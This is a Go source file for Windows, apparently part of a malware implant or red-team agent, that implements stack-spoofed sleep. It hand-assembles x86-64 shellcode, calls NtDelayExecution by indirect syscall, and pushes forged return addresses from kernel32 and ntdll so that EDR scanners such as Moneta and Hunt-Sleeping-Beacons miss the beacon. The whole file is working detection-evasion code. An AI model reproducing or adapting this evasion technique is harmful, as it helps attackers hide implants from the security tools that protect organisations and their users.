//go:build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// stackSpoofState manages the dedicated sleep thread and its machine code stub.
// The thread executes NtDelayExecution with a spoofed call stack so EDR thread
// scanners (Hunt-Sleeping-Beacons, Moneta) see legitimate DLL return addresses
// instead of Go runtime / agent code addresses.
type stackSpoofState struct {
	mu            sync.Mutex
	initialized   bool
	threadHandle  windows.Handle
	sleepEvent    windows.Handle // signaled by Go to start a sleep cycle
	doneEvent     windows.Handle // signaled by stub when sleep completes
	stubAddr      uintptr        // VirtualAlloc'd executable stub
	stubSize      uintptr
	dataAddr      uintptr        // stub's mutable data block (RW)
	dataSize      uintptr
	spoofStackAddr uintptr       // separate stack for spoofed frames
	spoofStackSize uintptr
	runtimeFuncTable uintptr     // RtlAddFunctionTable entry
}

var (
	stackSpoof      stackSpoofState
	stackSpoofReady bool
)

// data block layout (mutable RW memory shared between Go and the stub)
const (
	dataOffSleepEvent      = 0   // 8 bytes: HANDLE
	dataOffDoneEvent       = 8   // 8 bytes: HANDLE
	dataOffDelayInterval   = 16  // 8 bytes: LARGE_INTEGER (negative 100ns units)
	dataOffSavedRSP        = 24  // 8 bytes: saved RSP
	dataOffSpoofStackTop   = 32  // 8 bytes: top of spoofed stack
	dataOffSyscallRetGadget = 40 // 8 bytes: ntdll syscall;ret gadget address
	dataOffNtDelaySysNum   = 48  // 4 bytes: NtDelayExecution syscall number
	dataOffWaitForSingleObj = 52 // 8 bytes: kernel32!WaitForSingleObjectEx addr
	dataOffSetEvent        = 60  // 8 bytes: kernel32!SetEvent addr
	dataOffRetGadget1      = 68  // 8 bytes: kernel32 ret gadget (SleepEx area)
	dataOffRetGadget2      = 76  // 8 bytes: kernel32!BaseThreadInitThunk+0x14 area
	dataOffRetGadget3      = 84  // 8 bytes: ntdll!RtlUserThreadStart+0x21 area
	dataBlockSize          = 96  // total
)

// InitStackSpoof initializes the stack spoofing infrastructure. Call after
// InitIndirectSyscalls (needs NtDelayExecution's syscall number and gadget).
func InitStackSpoof() error {
	return stackSpoof.init()
}

// StackSpoofAvailable returns true if stack-spoofed sleep is ready.
func StackSpoofAvailable() bool {
	return stackSpoofReady
}

// StackSpoofSleep performs a sleep using the dedicated thread with spoofed
// call stack frames. Falls back to time.Sleep if not initialized.
func StackSpoofSleep(d time.Duration) {
	if !stackSpoofReady {
		time.Sleep(d)
		return
	}
	stackSpoof.sleep(d)
}

func (s *stackSpoofState) init() error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.initialized {
		return nil
	}

	// Resolve gadgets from loaded DLLs
	gadgets, err := findSpoofGadgets()
	if err != nil {
		return fmt.Errorf("find gadgets: %w", err)
	}

	// Need NtDelayExecution from the indirect syscall resolver
	ntDelayEntry := indirectSyscallResolver.entries["NtDelayExecution"]
	if ntDelayEntry == nil || ntDelayEntry.SyscallRet == 0 {
		return fmt.Errorf("NtDelayExecution not resolved")
	}

	// Create synchronization events
	sleepEvt, err := windows.CreateEvent(nil, 0, 0, nil) // auto-reset
	if err != nil {
		return fmt.Errorf("create sleep event: %w", err)
	}
	doneEvt, err := windows.CreateEvent(nil, 0, 0, nil) // auto-reset
	if err != nil {
		windows.CloseHandle(sleepEvt)
		return fmt.Errorf("create done event: %w", err)
	}

	// Allocate data block (RW, not executable)
	s.dataSize = uintptr(dataBlockSize)
	dataAddr, err := windows.VirtualAlloc(0, s.dataSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		windows.CloseHandle(sleepEvt)
		windows.CloseHandle(doneEvt)
		return fmt.Errorf("memory alloc data: %w", err)
	}
	s.dataAddr = dataAddr

	// Allocate spoofed stack (RW, 64KB — grows downward)
	s.spoofStackSize = 64 * 1024
	spoofStack, err := windows.VirtualAlloc(0, s.spoofStackSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
		windows.CloseHandle(sleepEvt)
		windows.CloseHandle(doneEvt)
		return fmt.Errorf("memory alloc stack: %w", err)
	}
	s.spoofStackAddr = spoofStack

	// Fill data block
	data := unsafe.Slice((*byte)(unsafe.Pointer(dataAddr)), dataBlockSize)
	binary.LittleEndian.PutUint64(data[dataOffSleepEvent:], uint64(sleepEvt))
	binary.LittleEndian.PutUint64(data[dataOffDoneEvent:], uint64(doneEvt))
	binary.LittleEndian.PutUint64(data[dataOffSavedRSP:], 0)
	// Stack grows downward — top is base + size, aligned to 16 bytes
	spoofTop := (spoofStack + s.spoofStackSize) &^ 0xF
	binary.LittleEndian.PutUint64(data[dataOffSpoofStackTop:], uint64(spoofTop))
	binary.LittleEndian.PutUint64(data[dataOffSyscallRetGadget:], uint64(ntDelayEntry.SyscallRet))
	binary.LittleEndian.PutUint32(data[dataOffNtDelaySysNum:], uint32(ntDelayEntry.Number))
	binary.LittleEndian.PutUint64(data[dataOffWaitForSingleObj:], uint64(gadgets.waitForSingleObject))
	binary.LittleEndian.PutUint64(data[dataOffSetEvent:], uint64(gadgets.setEvent))
	binary.LittleEndian.PutUint64(data[dataOffRetGadget1:], uint64(gadgets.retGadget1))
	binary.LittleEndian.PutUint64(data[dataOffRetGadget2:], uint64(gadgets.retGadget2))
	binary.LittleEndian.PutUint64(data[dataOffRetGadget3:], uint64(gadgets.retGadget3))

	// Generate and allocate the machine code stub
	stub := generateSleepStub()
	s.stubSize = uintptr(len(stub))
	// Allocate as RW first
	stubAddr, err := windows.VirtualAlloc(0, s.stubSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		windows.VirtualFree(spoofStack, 0, windows.MEM_RELEASE)
		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
		windows.CloseHandle(sleepEvt)
		windows.CloseHandle(doneEvt)
		return fmt.Errorf("memory alloc stub: %w", err)
	}
	// Copy stub code
	stubSlice := unsafe.Slice((*byte)(unsafe.Pointer(stubAddr)), len(stub))
	copy(stubSlice, stub)
	// Transition to RX (W^X)
	var oldProtect uint32
	err = windows.VirtualProtect(stubAddr, s.stubSize,
		windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		windows.VirtualFree(stubAddr, 0, windows.MEM_RELEASE)
		windows.VirtualFree(spoofStack, 0, windows.MEM_RELEASE)
		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
		windows.CloseHandle(sleepEvt)
		windows.CloseHandle(doneEvt)
		return fmt.Errorf("VirtualProtect stub RX: %w", err)
	}
	s.stubAddr = stubAddr

	// Register UNWIND_INFO so stack walkers treat our stub as a proper function
	s.runtimeFuncTable = registerStubUnwindInfo(stubAddr, s.stubSize)

	// Create the dedicated sleep thread (starts suspended)
	var threadID uint32
	hThread, err := createNativeThread(stubAddr, dataAddr, &threadID)
	if err != nil {
		if s.runtimeFuncTable != 0 {
			rtlDeleteFunctionTable(s.runtimeFuncTable)
		}
		windows.VirtualFree(stubAddr, 0, windows.MEM_RELEASE)
		windows.VirtualFree(spoofStack, 0, windows.MEM_RELEASE)
		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
		windows.CloseHandle(sleepEvt)
		windows.CloseHandle(doneEvt)
		return fmt.Errorf("thread creation: %w", err)
	}

	s.threadHandle = hThread
	s.sleepEvent = sleepEvt
	s.doneEvent = doneEvt
	s.initialized = true
	stackSpoofReady = true

	// Resume the thread — it immediately enters WaitForSingleObject
	procResumeThread.Call(uintptr(hThread))
	return nil
}

func (s *stackSpoofState) sleep(d time.Duration) {
	s.mu.Lock()
	if !s.initialized {
		s.mu.Unlock()
		time.Sleep(d)
		return
	}
	dataAddr := s.dataAddr
	sleepEvt := s.sleepEvent
	doneEvt := s.doneEvent
	s.mu.Unlock()

	// Write sleep duration as negative 100ns units (LARGE_INTEGER)
	ns := d.Nanoseconds()
	ticks := -(ns / 100)
	data := unsafe.Slice((*byte)(unsafe.Pointer(dataAddr)), dataBlockSize)
	binary.LittleEndian.PutUint64(data[dataOffDelayInterval:], uint64(ticks))

	// Signal the stub thread to start sleeping
	windows.SetEvent(sleepEvt)

	// Wait for the stub thread to finish sleeping
	windows.WaitForSingleObject(doneEvt, windows.INFINITE)
}

// spoofGadgets holds addresses of gadgets found in loaded system DLLs.
type spoofGadgets struct {
	waitForSingleObject uintptr // kernel32!WaitForSingleObjectEx
	setEvent            uintptr // kernel32!SetEvent
	retGadget1          uintptr // ret inside kernel32 (near SleepEx)
	retGadget2          uintptr // ret inside kernel32 (near BaseThreadInitThunk)
	retGadget3          uintptr // ret inside ntdll (near RtlUserThreadStart)
}

func findSpoofGadgets() (*spoofGadgets, error) {
	kernel32, err := windows.LoadDLL("kernel32.dll")
	if err != nil {
		return nil, fmt.Errorf("load kernel32: %w", err)
	}
	ntdll, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return nil, fmt.Errorf("load ntdll: %w", err)
	}

	waitAddr, err := kernel32.FindProc("WaitForSingleObject")
	if err != nil {
		return nil, fmt.Errorf("find WaitForSingleObject: %w", err)
	}
	setEvtAddr, err := kernel32.FindProc("SetEvent")
	if err != nil {
		return nil, fmt.Errorf("find SetEvent: %w", err)
	}

	// Find ret gadgets (0xC3) near well-known functions
	sleepExAddr, _ := kernel32.FindProc("SleepEx")
	baseThreadAddr, _ := kernel32.FindProc("BaseThreadInitThunk")
	rtlUserAddr, _ := ntdll.FindProc("RtlUserThreadStart")

	g := &spoofGadgets{
		waitForSingleObject: waitAddr.Addr(),
		setEvent:            setEvtAddr.Addr(),
	}

	// Scan for ret (0xC3) within each function, skipping the first few bytes
	if sleepExAddr != nil {
		g.retGadget1 = findRetGadget(sleepExAddr.Addr(), 16, 256)
	}
	if baseThreadAddr != nil {
		g.retGadget2 = findRetGadget(baseThreadAddr.Addr(), 16, 128)
	}
	if rtlUserAddr != nil {
		g.retGadget3 = findRetGadget(rtlUserAddr.Addr(), 16, 128)
	}

	// Fallback: scan kernel32/ntdll for any ret gadgets
	if g.retGadget1 == 0 {
		g.retGadget1 = findRetGadget(waitAddr.Addr(), 16, 256)
	}
	if g.retGadget2 == 0 {
		g.retGadget2 = g.retGadget1
	}
	if g.retGadget3 == 0 {
		rtlAddr, _ := ntdll.FindProc("RtlExitUserThread")
		if rtlAddr != nil {
			g.retGadget3 = findRetGadget(rtlAddr.Addr(), 8, 128)
		}
	}

	if g.retGadget1 == 0 || g.retGadget2 == 0 || g.retGadget3 == 0 {
		return nil, fmt.Errorf("failed to find ret gadgets (r1=%x r2=%x r3=%x)",
			g.retGadget1, g.retGadget2, g.retGadget3)
	}

	return g, nil
}

// findRetGadget scans code starting at addr+skip for a ret instruction (0xC3).
func findRetGadget(addr uintptr, skip, maxScan int) uintptr {
	if addr == 0 {
		return 0
	}
	scan := unsafe.Slice((*byte)(unsafe.Pointer(addr+uintptr(skip))), maxScan-skip)
	for i, b := range scan {
		if b == 0xC3 {
			return addr + uintptr(skip) + uintptr(i)
		}
	}
	return 0
}

// generateSleepStub generates x86-64 machine code for the dedicated sleep thread.
// The stub loops: wait for signal → spoof stack → NtDelayExecution → restore → signal done.
//
// RCX (first param from thread creation) = pointer to data block.
// The data block is mutable RW memory with event handles, gadget addresses, and timing.
func generateSleepStub() []byte {
	var code []byte

	// Prologue
	code = append(code, 0x55)                   // push rbp
	code = append(code, 0x48, 0x89, 0xE5)       // mov rbp, rsp
	code = append(code, 0x53)                   // push rbx
	code = append(code, 0x41, 0x54)             // push r12
	code = append(code, 0x48, 0x83, 0xEC, 0x20) // sub rsp, 0x20

	// Save data pointer in callee-saved register
	code = append(code, 0x48, 0x89, 0xCB) // mov rbx, rcx

	// === WAIT LOOP ===
	waitLoopOffset := len(code)

	// WaitForSingleObject(sleep_event, INFINITE)
	code = append(code, 0x48, 0x8B, 0x4B, byte(dataOffSleepEvent)) // mov rcx, [rbx+off]
	code = append(code, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF)               // mov edx, INFINITE
	code = append(code, 0xFF, 0x53, byte(dataOffWaitForSingleObj))   // call [rbx+off]

	// Save real RSP
	code = append(code, 0x48, 0x89, 0x63, byte(dataOffSavedRSP)) // mov [rbx+off], rsp

	// Switch to spoofed stack
	code = append(code, 0x48, 0x8B, 0x63, byte(dataOffSpoofStackTop)) // mov rsp, [rbx+off]

	// Build spoofed frames (push order: first push = bottom of stack)
	// Frame 3 (bottom): ntdll ret gadget
	code = append(code, 0xFF, 0x73, byte(dataOffRetGadget3))       // push [rbx+off]
	code = append(code, 0x48, 0x83, 0xEC, 0x20)                   // sub rsp, 0x20 (shadow)

	// Frame 2: kernel32!BaseThreadInitThunk ret gadget
	code = append(code, 0xFF, 0x73, byte(dataOffRetGadget2))       // push [rbx+off]
	code = append(code, 0x48, 0x83, 0xEC, 0x20)                   // sub rsp, 0x20 (shadow)

	// post_sleep return address (retGadget1's ret will pop this)
	leaR12Offset := len(code)
	code = append(code, 0x4C, 0x8D, 0x25)       // lea r12, [rip+disp32]
	code = append(code, 0x00, 0x00, 0x00, 0x00)  // placeholder
	code = append(code, 0x41, 0x54)               // push r12

	// Frame 1 (top): kernel32!SleepEx ret gadget — this is RSP+0 at syscall time
	code = append(code, 0xFF, 0x73, byte(dataOffRetGadget1)) // push [rbx+off]

	// === INDIRECT SYSCALL: NtDelayExecution ===
	// NtDelayExecution(Alertable=FALSE, DelayInterval=&data->delay)
	code = append(code, 0x31, 0xC9)             // xor ecx, ecx (Alertable=FALSE)
	code = append(code, 0x48, 0x8D, 0x53, byte(dataOffDelayInterval)) // lea rdx, [rbx+off]
	code = append(code, 0x4C, 0x8B, 0xD1)       // mov r10, rcx
	code = append(code, 0x8B, 0x43, byte(dataOffNtDelaySysNum)) // mov eax, [rbx+off]
	// jmp [rbx + SYSCALL_RET_GADGET_OFF]
	code = append(code, 0xFF, 0x63, byte(dataOffSyscallRetGadget))

	// === POST-SLEEP: control returns here via ROP chain ===
	// syscall;ret → retGadget1 (kernel32 ret) → pops post_sleep addr → jumps here
	postSleepOffset := len(code)

	// Patch the lea r12 displacement
	disp := int32(postSleepOffset - (leaR12Offset + 7)) // RIP-relative from end of lea instruction
	binary.LittleEndian.PutUint32(code[leaR12Offset+3:leaR12Offset+7], uint32(disp))

	// Restore real RSP
	code = append(code, 0x48, 0x8B, 0x63, byte(dataOffSavedRSP)) // mov rsp, [rbx+off]

	// Signal done: SetEvent(done_event)
	code = append(code, 0x48, 0x8B, 0x4B, byte(dataOffDoneEvent)) // mov rcx, [rbx+off]
	code = append(code, 0xFF, 0x53, byte(dataOffSetEvent))         // call [rbx+off]

	// Loop back to wait
	jmpOffset := len(code)
	code = append(code, 0xE9) // jmp rel32
	rel := int32(waitLoopOffset - (jmpOffset + 5))
	code = append(code, 0x00, 0x00, 0x00, 0x00)
	binary.LittleEndian.PutUint32(code[jmpOffset+1:jmpOffset+5], uint32(rel))

	return code
}

// createNativeThread creates a Windows thread outside Go's runtime, starting
// at stubAddr with dataAddr as the parameter. Thread is created suspended.
func createNativeThread(stubAddr, dataAddr uintptr, threadID *uint32) (windows.Handle, error) {
	h, _, err := procCreateThread.Call(
		0,        // security attributes
		0,        // default stack size
		stubAddr, // start address
		dataAddr, // parameter (data block pointer)
		uintptr(windows.CREATE_SUSPENDED),
		uintptr(unsafe.Pointer(threadID)),
	)
	if h == 0 {
		return 0, err
	}
	return windows.Handle(h), nil
}

// RUNTIME_FUNCTION for x64 exception handling / stack unwinding
type runtimeFunction struct {
	BeginAddress uint32
	EndAddress   uint32
	UnwindData   uint32
}

// UNWIND_INFO for a leaf function (no stack adjustments)
type unwindInfoLeaf struct {
	VersionFlags  byte // Version=1, Flags=0
	PrologSize    byte
	CountOfCodes  byte
	FrameRegister byte // 0 = none
}

// registerStubUnwindInfo registers RUNTIME_FUNCTION entries for the stub
// so Windows stack walkers can unwind through it properly.
func registerStubUnwindInfo(stubAddr, stubSize uintptr) uintptr {
	// Allocate space for RUNTIME_FUNCTION + UNWIND_INFO adjacent to each other
	// Layout: [RUNTIME_FUNCTION (12 bytes)] [UNWIND_INFO (4 bytes)]
	allocSize := uintptr(16)
	mem, err := windows.VirtualAlloc(0, allocSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return 0
	}

	// RUNTIME_FUNCTION
	rf := (*runtimeFunction)(unsafe.Pointer(mem))
	rf.BeginAddress = 0
	rf.EndAddress = uint32(stubSize)
	rf.UnwindData = 12 // offset to UNWIND_INFO from base

	// UNWIND_INFO (treat as leaf function — no frame adjustments)
	ui := (*unwindInfoLeaf)(unsafe.Pointer(mem + 12))
	ui.VersionFlags = 1 // UNW_VERSION=1, UNW_FLAG_NHANDLER=0
	ui.PrologSize = 0
	ui.CountOfCodes = 0
	ui.FrameRegister = 0

	// RtlAddFunctionTable(FunctionTable, EntryCount, BaseAddress)
	rtlAddFT := windows.NewLazyDLL("ntdll.dll").NewProc("RtlAddFunctionTable")
	ret, _, _ := rtlAddFT.Call(mem, 1, stubAddr)
	if ret == 0 {
		windows.VirtualFree(mem, 0, windows.MEM_RELEASE)
		return 0
	}
	return mem
}

func rtlDeleteFunctionTable(tableAddr uintptr) {
	rtlDelFT := windows.NewLazyDLL("ntdll.dll").NewProc("RtlDeleteFunctionTable")
	rtlDelFT.Call(tableAddr)
}

// CleanupStackSpoof tears down the sleep thread and frees resources.
func CleanupStackSpoof() {
	stackSpoof.mu.Lock()
	defer stackSpoof.mu.Unlock()
	if !stackSpoof.initialized {
		return
	}
	stackSpoofReady = false
	stackSpoof.initialized = false

	procTerminateThread.Call(uintptr(stackSpoof.threadHandle), 0)
	windows.CloseHandle(stackSpoof.threadHandle)
	windows.CloseHandle(stackSpoof.sleepEvent)
	windows.CloseHandle(stackSpoof.doneEvent)

	if stackSpoof.runtimeFuncTable != 0 {
		rtlDeleteFunctionTable(stackSpoof.runtimeFuncTable)
	}
	windows.VirtualFree(stackSpoof.stubAddr, 0, windows.MEM_RELEASE)
	windows.VirtualFree(stackSpoof.dataAddr, 0, windows.MEM_RELEASE)
	windows.VirtualFree(stackSpoof.spoofStackAddr, 0, windows.MEM_RELEASE)
}
